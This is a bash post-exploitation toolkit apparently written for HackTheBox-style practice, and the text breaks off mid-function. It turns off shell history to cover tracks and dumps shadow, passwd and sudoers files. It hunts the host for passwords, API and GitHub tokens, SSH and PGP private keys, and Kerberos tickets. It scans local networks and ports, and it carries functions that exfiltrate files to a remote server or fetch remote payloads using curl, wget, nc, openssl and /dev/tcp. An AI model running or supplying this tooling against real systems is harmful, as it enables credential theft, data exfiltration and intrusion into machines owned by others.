#!/bin/bash

# metalgvc

export HISTSIZE=0
export HISTFILE=/dev/null

# HTB Linux Creds Hunting: https://academy.hackthebox.com/module/147/section/1320

# TODO:
# https://github.com/AlessandroZ/LaZagne

# TODO:
# - execute remote script thru proxy
# - detect if script is running in docker/lxc
# - implement privesc module

SCRIPT=$0
INNER_SCRIPT=$1

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;36m'
NC='\033[0m'
DIV="${YELLOW}------------------------------------------------------------------------------${NC}"

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"

function separator() { echo -e "$DIV\n"; }
function header() { echo -e "$DIV"; echo -e "${YELLOW}- $1${NC}"; }
function tip() { msg=$1; echo -e "${RED} TIP: ${NC}${BLUE}${msg}${NC}"; }
function tips() { msg=$1; echo -e "\t${BLUE}- ${msg}${NC}"; }
function warn() { msg=$1; echo -e "${YELLOW}${msg}${NC}"; }

# ======================================================================================================================
# kerberos tickets

function action_kerberos() {
  header "search kerberos tickets"
  tip "https://academy.hackthebox.com/module/147/section/1657"
  #tip "import ticket into session: klist -k -t /path/to/keytab && smbclient //dc01/userdir -k -c ls"
  #tip "extract info: keytabextract.py /path/to/keytab"
  #tip "klist -k -t /etc/krb5.keytab \n klist \n kinit 'LINUX01\$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab \n smbclient -N -L //DC01/"

  find / -name '*keytab*' ! -name '*.py' ! -name '*.pyc' ! -name '*.so' ! -name '*.so.0' ! -name '*.rb' ! -name '*.md' -ls 2>/dev/null

  header "possible kerberos tickets"
  find / -name '*.kt' -ls 2>/dev/null
  separator

  header "PS - Check if Linux Machine is Domain Joined"
  ps -ef | grep -i "winbind\|sssd"
  separator

  if which realm &> /dev/null; then
    header "realm - Check If Linux Machine is Domain Joined"
    realm list
    separator
  fi

  header "Finding ccache Files"
  tip "https://academy.hackthebox.com/module/147/section/1657"
  tip "ls -la /tmp && cp /tmp/krb5cc_file . && export KRB5CCNAME=/root/krb5cc_file && klist && smbclient //dc01/C$ -k -c ls -no-pass"
  env | grep -i krb5
  separator
}

# ======================================================================================================================
# user(s)

function action_users() {

  SHADOW_FILES=$(find /etc -name '*shadow*' 2>/dev/null -readable -exec cat {} \;)
  if [[ -n $SHADOW_FILES ]]; then
    header "shadow files"
    warn "shadow files contents:"
    echo "$SHADOW_FILES"
    separator
  fi

  header "/etc/passwd"
  cat /etc/passwd
  separator

  header "/etc/group"
  cat /etc/group
  separator

  header "id"
  id
  separator

  header "users:"
  grep -E '.*sh$' /etc/passwd
  separator

  header "ls -la /home"
  ls -la /home
  separator

  header "tail /home/*/.bash*"
  tail -n 50 /home/*/.bash*
  separator

  header "user notes"
  #find /home/* -type f -name "*.txt" -o ! -name "*.*"
  #find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) -size -10k -exec file --mime-type {} \; | grep 'text/plain' | grep -v -E '(.mozilla/firefox)|(/.oh-my-zsh/)|(/.local/)|(/.BurpSuite/)|(/.git/)|(/LICENSE)|(/lib/)|(/.npm/)|(/.config/)|(/.cache/)' | cut -d: -f1
  find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) -size -10k \
      \( ! -path "*/.mozilla/*" -a ! -path "*/.oh-my-zsh/*" -a ! -path "*/.local/*" \
      -a ! -path "*/.BurpSuite/*" -a ! -path "*/.git/*" -a ! -path "*/LICENSE" \
      -a ! -path "*/lib/*" -a ! -path "*/.npm/*" -a ! -path "*/.config/*" \
      -a ! -path "*/.cache/*" -a ! -path "*/cache/*" -a ! -name "license" \
      -a ! -path "*/node_modules/*" -a ! -path "*/.cargo/*" \
      -a ! -path "*/.pyenv/*" -a ! -path "*/.nvm/*"\) \
      -exec file --mime-type {} \; 2>/dev/null | grep 'text/plain' | cut -d: -f1
  separator

  header "ls -la /etc/security"
  ls -la /etc/security 2>/dev/null
  separator

  header "env"
  env
  separator

  # SSL logging enabled ! c
  SSLKEYLOGFILE_PATH=$(env | grep 'SSLKEYLOGFILE')
  if [[ -n $SSLKEYLOGFILE_PATH ]]; then
    warn "SSL Logging enabled: ${SSLKEYLOGFILE_PATH}; can decrypt TLS traffic"
  fi

  header "history"
  history
  separator

  HISTORY_CREDS=$(history | grep -C1 -E '(pass)|(key)|(secret)|(token)|(api)|(pwd)|(ssh)|(gpg)|(pgp)|(login)|(creds)|(auth)')
  if [[ -n $HISTORY_CREDS ]]; then
    warn "History possible credentials: ${HISTORY_CREDS}"
  fi

  header "who"
  who
  separator

  header "w"
  w
  separator

  if which gpg &> /dev/null; then
    header "gpg --list-keys"
    gpg --list-keys
    tip "export private key: gpg --output private.pgp --armor --export-secret-key <uid-key-name>"
    separator
  fi

  # system login
  if which last &> /dev/null; then
    header "failed login attempts"
    last -f /var/log/btmp

    header "who is currently using the system"
    last -f /var/run/utmp

    header "who's used the system"
    last -f /var/log/wtmp
    separator
  fi

  if which lastlog &> /dev/null; then
    header "lastlog"
    lastlog
    separator
  fi

  header "users in sudo group"
  getent group sudo
  header "cat /etc/sudoers"
  cat /etc/sudoers
  header "ls -la /etc/sudoers.d"
  ls -la /etc/sudoers.d
  separator

  header "sudo version"
  sudo -V
  separator

  header "login shells /etc/shells"
  cat /etc/shells
  separator
}

# ======================================================================================================================
# cron & at

function action_cron() {
  header "ls -la /etc | grep cron"
  ls -la /etc | grep cron

  header "ls -la /etc/cron.*/"
  ls -la /etc/cron.*/

  header "crontab -l"
  crontab -l | grep -v -E '^\s*#' | grep -v -E '^\s*$'

  header "cat /etc/crontab"
  cat /etc/crontab | grep -v -E '^\s*#' | grep -v -E '^\s*$'

  header "cron and other logs /var/spool/"
  ls -la /var/spool/
  separator

  if which atq &> /dev/null; then
    header "atq"
    atq
    # at -c <job id>
    separator
  fi
}

# ======================================================================================================================
# network

function action_network() {
  if which ifconfig &> /dev/null; then
    header "ifconfig"
    ifconfig
  elif which ip &> /dev/null; then
    header "ip a"
    ip a
  else
    header "network interfaces"

    local mac_addr
    for iface in $(ls /sys/class/net); do
      mac_addr=$(cat /sys/class/net/"$interface"/address 2>/dev/null)
      echo "${iface} \t ${mac_addr}"
    done

    header "cat /proc/net/fib_trie"
    cat /proc/net/fib_trie

  fi
  separator

  # arp util
  if which arp &> /dev/null; then
    header "arp -a"
    arp -a
  else
    header "cat /proc/net/arp"
    cat /proc/net/arp
  fi
  separator

  # route util
  if which route &> /dev/null; then
    header "route"
    route
    separator
  fi

  # netstat util
  if which netstat &> /dev/null; then
    header "netstat -atnup"
    netstat -atnup
    separator

    if ! which route &> /dev/null; then
      header "netstat -r"
      netstat -r
      separator
    fi

  # ss util
  elif which ss &> /dev/null; then
    header "ss -atnup"
    ss -atnup
    separator
  fi

  # tcp connections without netstat
  if ! which netstat &> /dev/null; then
    header "established tcp connections"
    cat /proc/net/tcp
    separator
  fi

  # raw route table
  if ! which route &> /dev/null && ! which netstat &> /dev/null; then
    header "routes"
    cat /proc/net/route
    separator
  fi

  header "/etc/hosts"
  cat /etc/hosts | grep -v -E '^\s*#' | grep -v -E '^\s*$'
  separator

  header "/etc/resolv.conf"
  cat /etc/resolv.conf | grep -v -E '^\s*#' | grep -v -E '^\s*$'
  separator

  if [[ "$UID" -eq 0 ]]; then
    header "iptables -L --line-numbers -v"
    iptables -L --line-numbers -v
  fi
}

# ======================================================================================================================
# system

function action_system() {

  header "uname -a"
  uname -a
  separator

  header "hostname"
  hostname
  separator

  if [[ -f /etc/os-release ]]; then
    header "cat /etc/os-release"
    cat /etc/os-release
    separator
  fi

  if which lscpu &> /dev/null; then
    header "lscpu"
    lscpu
    separator
  fi

  header "cat /proc/cpuinfo"
  cat /proc/cpuinfo
  separator

  if which lsusb &> /dev/null; then
    header "lsusb"
    lsusb
    separator
  fi

  if which lspci &> /dev/null; then
    header "lspci"
    lspci
    separator
  fi

  if which lsmod &> /dev/null; then
    header "lsmod"
    lsmod
    separator
  fi

  header "/etc/fstab"
  cat /etc/fstab | grep -v '^#'
  separator

  header "lsblk"
  lsblk
  separator

  header "mount"
  mount
  separator

  header "df -h -T"
  df -h -T
  separator

  header "root processes"
  ps aux | grep root
  separator

  tip "'ps aux' enum processes"
  tip "see also: '/proc/<proc id>/cmdline' and other '/proc/<proc id>/...'"
}

function action_services() {
    if which systemctl &> /dev/null; then

      header "systemctl status"
      systemctl status | cat
      separator

      header "systemctl list-units"
      systemctl list-units | cat
      separator

      header "systemctl list-unit-files"
      systemctl list-unit-files | cat
      separator

      header "systemctl list-timers"
      systemctl list-timers | cat
      separator
    fi
}

# ======================================================================================================================
# search files

function action_search_project_config_files() {
  local SEARCH_IN="/var/www/* /home/* /opt/*"
  local EXT=".php .py .rb .sh .go"
  header "projects configs: ${EXT} IN ${SEARCH_IN}"
  for dir in $(echo $SEARCH_IN); do
    #echo -e "\n${YELLOW}Search in: ${dir}${NC}";
    for ext in $(echo $EXT); do
      find $dir -name *conf*$ext 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
      find $dir -name *setting*$ext 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
    done
  done
  separator
}

function action_search_db_files() {
  local EXT=".sql .db .*db .db* .sqlite3"
  header "db files & sql: ${EXT}"
  for ext in $(echo $EXT); do
    echo -e "\n${YELLOW}DB File extension: ${ext}${NC}";
    find / -type f -name *$ext 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";
  done
  separator
}


function action_search_backups() {
  local EXT=".bak .backup passwd* shadow*"
  header "files: ${EXT}"
  for ext in $(echo $EXT); do
    #echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find / -name *$ext 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man" | grep -v -E '(/usr/bin/)|(/usr/sbin/)';
  done
  separator
}


function action_search_script_files() {
  local SEARCH_IN="/var/www/* /home/* /opt/*"
  local EXT=".py .pyc .pl .go .jar .sh .php .rb .js"
  header "script files: ${EXT} IN ${SEARCH_IN}"
  for dir in $(echo $SEARCH_IN); do
    #echo -e "\n${YELLOW}Search in: ${dir}${NC}";
    for ext in $(echo $EXT); do
      find $dir -name *$ext 2>/dev/null | grep -v "doc\|lib\|headers\|share\|node_modules";
    done
  done
  separator
}


function action_search_sys_configs() {
  local EXT=".conf .config .cnf .cf"
  header "FILES: ${EXT}"
  for ext in $(echo $EXT); do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core\|headers\|.oh-my-zsh";
  done
  separator
}

function action_search_docs() {
  local EXT=".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"
  header "FILES: ${EXT}"
  for ext in $(echo $EXT); do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";
  done
  separator
}

function action_search_archives() {
  local EXT=".zip .rar .7z"
  header "FILES: ${EXT}"
  for ext in $(echo $EXT); do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";
  done
  separator
}

function action_search_env_files() {
  header ".env, .hashes, .credentials files"
  find / -name "*.env" -o -name "*.hashes" -o -name "*.credentials" 2>/dev/null;
  separator
}

function action_search_history_files() {
  header "history files"
  find / -type f -name "*.*history" -exec ls -la {} \; 2> /dev/null
  separator
}

function action_search_large_files() {
    header "large files"
    find / -type f -size +100M -exec ls -s '{}' \; 2>/dev/null | sort -n -r | head
    separator
}

function action_search_recent() {
  header "recent modified files"
  find / -type f -mmin -5 -not -path "/proc/*" 2>/dev/null
  separator
}

function action_search_suid_files() {
  header "SUID files"
  find / -perm -u=s -type f 2>/dev/null

  header "GUID files"
  find / -perm -g=s -type f 2>/dev/null
  separator
}

function action_search_acl_files() {
  header "search ACL files"
  find / -path '/proc/*' -prune -o -exec ls -ld {} + 2>/dev/null | awk '$1 ~ /\+$/ {print $1, $NF}'
  separator
}

function action_other_files() {
    header ".vimrc files"
    find /home/* -type f -name ".vimrc" 2> /dev/null
    separator
}

# ======================================================================================================================
# search writable dirs & files

function action_search_writable_dirs() {
  header "writable dirs for all"
  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
  separator

  header "writable dirs for current user [${USER}] out of home dir"
  find / -path "$HOME" -prune -o -path /proc -prune -o -type d -writable -print 2>/dev/null
  separator
}

function action_search_writable_files() {
  header "writable files for all"
  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
  separator

  header "writable files for current user [${USER}] out of home dir"
  find / -path "$HOME" -prune -o -path /proc -prune -o -type f -writable -print 2>/dev/null
  separator
}

# ======================================================================================================================
# search in files

function action_search_passwords() {
  local SEARCH_IN="/var/* /home/* /opt/* /etc/*"
  header "passwords, api keys, tokens"
  for dir in $(echo $SEARCH_IN); do
    echo -e "${YELLOW}- search in: ${dir} --------------------${NC}"
    find "${dir}" \
      -path '/var/lib' -prune -o \
      -path '*/.local/lib/*' -prune -o \
      -path '*/.oh-my-zsh/*' -prune -o \
      -path '*/node_modules/*' -prune -o \
      -size -10k -type f \
      -exec grep -H -i "password\|apikey\|api_key\|apitoken\|token\|db_user" {} \; -o \
      -exec grep -H -E "gho_.{36}" {} \; 2>/dev/null
  done
  separator
}

function action_ssh_pgp_keys() {
  local SEARCH_IN="/var/* /home/* /opt/* /etc/*"
  header "ssh, pgp keys"
  for dir in $(echo $SEARCH_IN); do
    echo -e "${YELLOW}- search in: ${dir} --------------------${NC}"
    find $dir -type f -exec grep -H -- "-----BEGIN" {} \; 2>/dev/null
  done
  separator
}

function action_ssh_keys() {
  header "SSH private keys"
  grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" | cut -d: -f1 | sort -u
  separator

  header "SSH public keys"
  grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1" | cut -d: -f1 | sort -u
  separator

  header "SSH known_hosts"
  find / -name known_hosts -print -exec cat {} \; 2>/dev/null
  separator

  header "SSH authorized_keys"
  find / -name authorized_keys -print -exec cat {} \; 2>/dev/null
  separator
}

# ======================================================================================================================
# installed soft

function action_installed_packages() {
  header "installed packages"

  if which apt &> /dev/null; then
    apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g'
  elif which dpkg &> /dev/null; then
    dpkg -l
  elif which rpm &> /dev/null; then
    rpm -qa
  fi
  separator
}

# ======================================================================================================================
# logs

function action_parse_logs() {
  header "parse logs"
  for i in $(ls /var/log/* 2>/dev/null); do
    GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null);
    if [[ $GREP ]]; then
      echo -e "\n${YELLOW}#### Log file: ${i}${NC}";
      grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;
    fi;
  done
  separator

  tip "see logs also:"
  tips "/var/log/messages   Generic system activity logs."
  tips "/var/log/syslog     Generic system activity logs."
  tips "/var/log/auth.log   (Debian) All authentication related logs."
  tips "/var/log/secure     (RedHat/CentOS) All authentication related logs."
  tips "/var/log/boot.log   Booting information."
  tips "/var/log/dmesg      Hardware and drivers related information and logs."
  tips "/var/log/kern.log   Kernel related warnings, errors and logs."
  tips "/var/log/faillog    Failed login attempts."
  tips "/var/log/cron       Information related to cron jobs."
  tips "/var/log/mail.log   All mail server related logs."
  tips "/var/log/httpd      All Apache related logs."
  tips "/var/log/mysqld.log All MySQL server related logs."

  separator
}

# ======================================================================================================================
# transfer files

function action_send_file_https() {
  #tip "http(s) server or nc listener must started on remote host:"
  #tips "openssl req -x509 -out /root/.config/tmpcert.pem -keyout /root/.config/tmpcert.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'"
  #tips "pipx run uploadserver 443 --server-certificate /root/.config/tmpcert.pem"

  local URL=$1
  local FILEPATH=$2
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=443
  #local URLPATH=$(echo "$URL" | cut -d'/' -f4- | sed 's/^/\/;s/$/;/' )
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME=$(basename "$FILEPATH")

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" -X POST "$URL" -F "files=@${FILEPATH}" --insecure
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    warn "using wget..."

    boundary=$(date +%s%N | sha256sum | head -c 32)
    tmpfile=$(mktemp)

    printf -- "--%s\r\n" "$boundary" > "$tmpfile"
    printf 'Content-Disposition: form-data; name="files"; filename="%s"\r\n' "$(basename "$FILEPATH")" >> "$tmpfile"
    printf "Content-Type: application/octet-stream\r\n\r\n" >> "$tmpfile"
    cat "$FILEPATH" >> "$tmpfile"
    printf -- "\r\n--%s--\r\n" "$boundary" >> "$tmpfile"

    wget --user-agent="$UA" --tries=1 --post-file="$tmpfile" --header="Content-Type: multipart/form-data; boundary=$boundary" --no-check-certificate "$URL" -O -
    rslt=$?

    rm "$tmpfile"
  fi

  # openssl s_client
  if [ "$rslt" -ne 0 ] && which openssl &> /dev/null; then
    warn "openssl s_client -connect $HOST:$PORT ..."

    boundary="----WebKitFormBoundary$(date +%s%N)" # Generate a unique boundary
    {
      echo -e "POST $URLPATH HTTP/1.1\r"
      echo -e "Host: $HOST\r"
      echo -e "Content-Type: multipart/form-data; boundary=$boundary\r"
      echo -e "Content-Length: $(wc -c < <(
        echo -e "--$boundary\r"
        echo -e "Content-Disposition: form-data; name=\"files\"; filename=\"${FNAME}\"\r"
        echo -e "Content-Type: application/octet-stream\r"
        echo -e "\r"
        cat $FILEPATH
        echo -e "\r"
        echo -e "--$boundary--\r"
      ))\r"
      echo -e "\r"
      echo -e "--$boundary\r"
      echo -e "Content-Disposition: form-data; name=\"files\"; filename=\"${FNAME}\"\r"
      echo -e "Content-Type: application/octet-stream\r"
      echo -e "\r"
      cat $FILEPATH
      echo -e "\r"
      echo -e "--$boundary--\r"
    } | openssl s_client -connect $HOST:$PORT
    rslt=$?
  fi

  return $rslt
}

function action_send_file_http() {
  local URL=$1
  local FILEPATH=$2
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  #local URLPATH=$(echo "$URL" | cut -d'/' -f4- | sed 's/^/\/;s/$/;/' )
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME=$(basename "$FILEPATH")

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

   # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" -X POST "$URL" -F "files=@${FILEPATH}"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    warn "using wget..."

    boundary=$(date +%s%N | sha256sum | head -c 32)
    tmpfile=$(mktemp)

    printf -- "--%s\r\n" "$boundary" > "$tmpfile"
    printf 'Content-Disposition: form-data; name="files"; filename="%s"\r\n' "$(basename "$FILEPATH")" >> "$tmpfile"
    printf "Content-Type: application/octet-stream\r\n\r\n" >> "$tmpfile"
    cat "$FILEPATH" >> "$tmpfile"
    printf -- "\r\n--%s--\r\n" "$boundary" >> "$tmpfile"

    wget --user-agent="$UA" --tries=1 --post-file="$tmpfile" --header="Content-Type: multipart/form-data; boundary=$boundary" "$URL" -O -
    rslt=$?

    rm "$tmpfile"
  fi

  # nc
  if [ "$rslt" -ne 0 ] && which nc &> /dev/null; then
    warn "http using nc"

    boundary="----WebKitFormBoundary$(date +%s%N)" # Generate a unique boundary
    {
      echo -e "POST $URLPATH HTTP/1.1\r"
      echo -e "Host: $HOST\r"
      echo -e "Content-Type: multipart/form-data; boundary=$boundary\r"
      echo -e "Content-Length: $(wc -c < <(
        echo -e "--$boundary\r"
        echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
        echo -e "Content-Type: application/octet-stream\r"
        echo -e "\r"
        cat $FILEPATH
        echo -e "\r"
        echo -e "--$boundary--\r"
      ))\r"
      echo -e "\r"
      echo -e "--$boundary\r"
      echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
      echo -e "Content-Type: application/octet-stream\r"
      echo -e "\r"
      cat $FILEPATH
      echo -e "\r"
      echo -e "--$boundary--\r"
    } | nc $HOST $PORT
  fi
}

function action_download_file_code() {
  local URL=$1
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  rslt=1

  # TODO - disable cert verification

  if [ "$rslt" -ne 0 ] && which python3 &> /dev/null; then
    python3 -c "import urllib.request;urllib.request.urlretrieve('${URL}', '${FNAME}')"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which python2.7 &> /dev/null; then
    python2.7 -c "import urllib;urllib.urlretrieve('${URL}', '${FNAME}')"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "\$file = file_get_contents('${URL}');file_put_contents('${FNAME}',\$file);"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "const BUFFER = 1024; \$fremote = fopen('${URL}', 'rb'); \$flocal = fopen('${FNAME}', 'wb'); while (\$buffer = fread(\$fremote, BUFFER)) { fwrite(\$flocal, \$buffer); } fclose(\$flocal); fclose(\$fremote);"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    ruby -e "require 'net/http'; File.write('${FNAME}', Net::HTTP.get(URI.parse('${URL}')))"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    perl -e "use LWP::Simple; getstore('${URL}', '${FNAME}');"
    rslt=$?
  fi

  #TODO nodejs
}

function action_download_file_https() {
  local URL=$1
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=443
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" --insecure -O "$URL"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --no-check-certificate --user-agent="$UA" "$URL"
    rslt=$?
  fi

  # openssl
#  if [ "$rslt" -ne 0 ] && which openssl &> /dev/null; then
#    {
#      echo -e "GET $URLPATH HTTP/1.1\r\nHost: $HOST\r\nConnection: close\r\n\r\n"
#    } | openssl s_client -connect "$HOST:$PORT" 2>/dev/null | sed -e '/^$/,$ d' > "$FNAME"
#    rslt=$?
#  fi

  # try D/L by code php, python, ruby, etc
  if [ "$rslt" -ne 0 ]; then
    action_download_file_code "$URL"
    rslt=$?
  fi

  if [ "$rslt" -eq 0 ]; then
    md5sum "$FNAME"
  fi
}

function action_download_file_http() {
  local URL=$1
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" "$URL" -o "$FNAME"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --user-agent="$UA" "$URL" -O "$FNAME"
    rslt=$?
  fi

  # bash
  if [ "$rslt" -ne 0 ]; then
    exec 3<>/dev/tcp/$HOST/$PORT
    echo -e "GET $URLPATH HTTP/1.1\r\n\r\n">&3
    cat <&3 > "$FNAME"
    rslt=$?
    exec 3>&-
  fi

  # TODO: nc

  if [ "$rslt" -ne 0 ]; then
    action_download_file_code "$URL"
    rslt=$?
  fi

  if [ "$rslt" -eq 0 ]; then
    md5sum "$FNAME"
  fi
}

# ======================================================================================================================
# monitoring

function action_fsmon() {
  local monpath="$1"
  local filesnum=${2:-30}

  clear
  echo "[files: ${filesnum}] $(date)"
  separator

  local files
  while true; do
    files=$(find "$monpath" -type f -mmin -5 -not -path "/proc/*" -not -path "/sys/*" -printf "%T@ %p\n" 2>/dev/null | sort -nr | head -n $filesnum)

    clear
    echo "[files: ${filesnum}] $(date)"
    separator

    while IFS= read -r line; do
      echo "$line"
    done <<< "$files"

    sleep 1
  done
}

# ======================================================================================================================

function script_info() {
  action_system
  action_users
  action_cron
  action_network
  action_services
}

function script_files() {
  action_search_env_files
  action_search_history_files
  action_kerberos
  action_search_project_config_files
  action_search_db_files
  action_search_backups
  action_search_script_files
  action_search_sys_configs
  action_search_docs
  action_search_archives
  action_search_large_files
  action_search_recent
  action_search_suid_files
  action_search_acl_files
  action_other_files
}

function script_search_writable_dirs_files() {
    action_search_writable_dirs
    action_search_writable_files
}

function script_passwords() {
  action_ssh_keys
  action_search_passwords
  action_ssh_pgp_keys
}

function script_logs() {
    action_parse_logs
}

function script_installed_soft() {
  tip "GTFObins https://gtfobins.github.io/"
  action_installed_packages
  # TODO list installed binaries & check for GTFObins
}

function script_scan_local_networks() {
    if [[ "$1" == "-h" ]]; then
      echo -e "usage: $SCRIPT $INNER_SCRIPT [IP/CIDR]"
      exit 1
    fi

    get_ips_and_masks() {

        if [[ -n $1 ]]; then
          echo "$1"
          return
        fi

        if command -v ip &>/dev/null; then
            ip -4 addr show scope global | awk '/inet / {print $2}'
        elif command -v ifconfig &>/dev/null; then
            ifconfig | awk '/inet / && $2 != "127.0.0.1" {print $2, $4}' | while read ip mask; do
                echo "$ip/$(mask2cidr $mask)"
            done
        else
            cat /proc/net/fib_trie | grep '+--' | awk '{print $2}' | sort -u | grep -vE '^127|^0'
        fi
    }

    mask2cidr() {
        local mask=$1
        IFS=. read -r i1 i2 i3 i4 <<< "$mask"
        local bin=$(printf "%08d%08d%08d%08d" \
            "$(bc <<< "obase=2;$i1")" \
            "$(bc <<< "obase=2;$i2")" \
            "$(bc <<< "obase=2;$i3")" \
            "$(bc <<< "obase=2;$i4")")
        echo "${bin//0/}" | wc -c
    }

    ip_to_int() {
        local ip="$1"
        IFS=. read -r o1 o2 o3 o4 <<< "$ip"
        echo $(( (o1 << 24) + (o2 << 16) + (o3 << 8) + o4 ))
    }

    int_to_ip() {
        local ip=$1
        echo "$(( (ip >> 24) & 255 )).$(( (ip >> 16) & 255 )).$(( (ip >> 8) & 255 )).$(( ip & 255 ))"
    }

    # print found IPs and masks
    echo -e "${GREEN}[+]${NC} Local IP/mask:"
    get_ips_and_masks $1

    for cidr in $(get_ips_and_masks $1); do
        IFS=/ read ip mask <<< "$cidr"
        [[ -z "$ip" || -z "$mask" ]] && continue

        echo -e "\n${YELLOW}[*] Scanning $cidr${NC}"
        ip_int=$(ip_to_int "$ip")
        netmask=$(( 0xFFFFFFFF << (32 - mask) & 0xFFFFFFFF ))
        network=$(( ip_int & netmask ))
        broadcast=$(( network | ~netmask & 0xFFFFFFFF ))

        for ((host=network+1; host<broadcast; host++)); do
            target=$(int_to_ip "$host")
            [[ "$target" == "$ip" ]] && continue
            (ping -c1 -W1 "$target" &>/dev/null && echo -e "${GREEN}[+]${NC} Host up: $target") &
        done
        wait
    done
}

function script_ports_scanner() {
  if [[ -z $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <IP> [start port - 1] [end port - 65535]"
    exit 1
  fi

  local IP=$1
  local START_PORT=${2:-1}
  local END_PORT=${3:-65535}
  local PROTO=${4:-tcp}

  header "scanning ${IP} ${START_PORT}-${END_PORT}"
  for (( port=$START_PORT; port<=$END_PORT; port++ )); do
    (echo > /dev/$PROTO/$IP/$port) &>/dev/null && echo "$IP $port"
  done
}

function script_ports_ncscanner() {
  if [[ -z $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <IP> [start port-1] [end port-65535]"
    #echo -e "usage: $SCRIPT $INNER_SCRIPT <IP> [start port-1] [end port-65535] [tcp|udp]"
    #echo -e " udp scan is very slow - 1 second per port"
    exit 1
  fi

  local IP=$1
  local START_PORT=${2:-1}
  local END_PORT=${3:-65535}

  header "scanning ${IP} ${START_PORT}-${END_PORT} ${PROTO}"
  local PROTO=""
  if [[ "$4" == "udp" ]]; then
    PROTO="u -w 1"
  fi
  nc -zv${PROTO} $IP ${START_PORT}-${END_PORT}
}

function script_sendfile() {
  if [[ "$1" == "-h" || -z $1 || -z $2 || ! -f $2 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <[http(s)|smb|ftp://]URL> <FILEPATH>"
    exit 1
  fi

  local URL=$1
  local FILEPATH=$2
  local CHECKSUM=$(md5sum $FILEPATH)

  local rslt=1

  warn "md5sum $CHECKSUM"

  # try send file using https
  if [[ $URL == https* ]]; then
    action_send_file_https "$URL" "$FILEPATH"
    rslt=$?

  # try send using http
  elif [[ $URL == http* ]]; then
    action_send_file_http "$URL" "$FILEPATH"
    rslt=$?
  fi

  # TODO: smb://, ftp://, nc://
  # TODO: encrypt file & show key in terminal (??)

  if [ $rslt -ne 0 ]; then
    warn "failed to send file, try another method, e.g. start server & D/L"
  fi
}

function script_start_httpserver() {
  if [[ "$1" == "-h" ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT [port] [directory]"
    exit 1
  fi

  local PORT=8080
  if [[ -n $1 ]]; then
    PORT="$1"
  fi

  if [[ -n $2 ]]; then
